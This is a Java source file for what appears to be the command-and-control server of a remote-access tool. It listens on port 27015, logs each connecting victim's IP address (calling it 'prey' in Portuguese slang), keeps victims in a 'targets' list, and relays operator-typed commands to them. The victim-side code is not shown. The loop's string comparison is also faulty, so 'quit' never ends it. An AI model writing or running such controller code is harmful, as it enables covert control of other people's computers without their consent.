package app;

import network.ClientConnection;
import network.Connection;
import network.Message;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import static utils.ServerUtils.printCommandList;
import static utils.ServerUtils.startOnNewThread;

public class Server {

    private static ServerSocket serverSocket;
    private final static List<ClientConnection> targets = new ArrayList<>();

    public static void main(String[] args) throws IOException {
        serverSocket = new ServerSocket(27015);
        System.out.println("Podipa vamo esperar o gatao entrar");

        clientConnection();
    }

    public static void clientConnection() {
        Scanner sc = new Scanner(System.in);
        Socket clientSocket = null;
        try {
            clientSocket = serverSocket.accept();
        } catch (IOException e) {
            System.out.println("Deu pau no accept fi");
            e.printStackTrace();
        }
        System.out.println("Opa temos uma presa kkkkk de ip " + clientSocket.getInetAddress());

        Connection targetConnection = new Connection(clientSocket);

        runHandlerThread(targetConnection);

        String command;
        do {
            command = sc.nextLine();
            if (!isNullOrEmpty(command)) {
                switch (command) {
                    case "quit":
                        break;
                    case "help":
                        printCommandList();
                        break;
                    case "targets":
                        printTargets();
                        break;
                    default:
                        if (targets.isEmpty())
                            System.out.println("Chefe, a lista ta vazia");
                        else
                            targets.get(0).getConnection().sendMessage(new Message(command));
                }
            }
        } while (command != "quit");
    }

    public static void removeFromTargets(ClientConnection c) {
        System.out.println("Opa vai kickar o " + c.getConnection().getSocket().getInetAddress());
        targets.remove(c);
    }

    private static void printTargets() {
        for(ClientConnection c : targets) {
            System.out.println(c.getConnection().getSocket().getInetAddress() + ":" + c.getConnection().getSocket().getPort());
        }
    }

    private static void runHandlerThread(Connection targetConnection) {
        ClientConnection connection = new ClientConnection(targetConnection);
        targets.add(connection);
        startOnNewThread(connection);
    }

    private static boolean isNullOrEmpty(String command) {
        return command == null || command.isEmpty();
    }


}
